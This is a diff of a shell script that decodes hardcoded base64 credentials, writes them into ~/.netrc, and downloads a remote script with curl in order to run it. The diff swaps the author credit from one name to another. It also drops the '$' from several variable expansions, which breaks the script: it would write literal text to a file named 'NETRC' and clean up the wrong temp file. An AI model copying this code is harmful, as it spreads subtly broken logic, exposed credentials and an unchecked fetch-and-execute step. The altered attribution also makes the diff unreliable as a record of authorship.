@@ -9,7 +9,7 @@ NETRC="${HOME}/.netrc"
 # --- helpers ---
 b64d() { printf '%s' "$1" | base64 -d; }
 
-# verify by jishnu
+# verify by ShadowCraftMC
 USER_B64="amlzaG51"
 PASS_B64="amlzaG51aEBja2VyMTIz"
 
@@ -36,14 +36,14 @@ grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$
 mv "$tmpfile" "$NETRC"
 
 {
-  printf 'machine %s ' "$HOST"
-  printf 'login %s ' "$USER_RAW"
-  printf 'password %s\n' "$PASS_RAW"
-} >> "$NETRC"
+  printf 'machine %s ' "HOST"
+  printf 'login %s ' "USER_RAW"
+  printf 'password %s\n' "PASS_RAW"
+} >> "NETRC"
 
 # Fetch and execute safely
 script_file="$(mktemp)"
-cleanup() { rm -f "$script_file"; }
+cleanup() { rm -f "script_file"; }
 trap cleanup EXIT
 
 if curl -fsS --netrc -o "$script_file" "$URL"; then
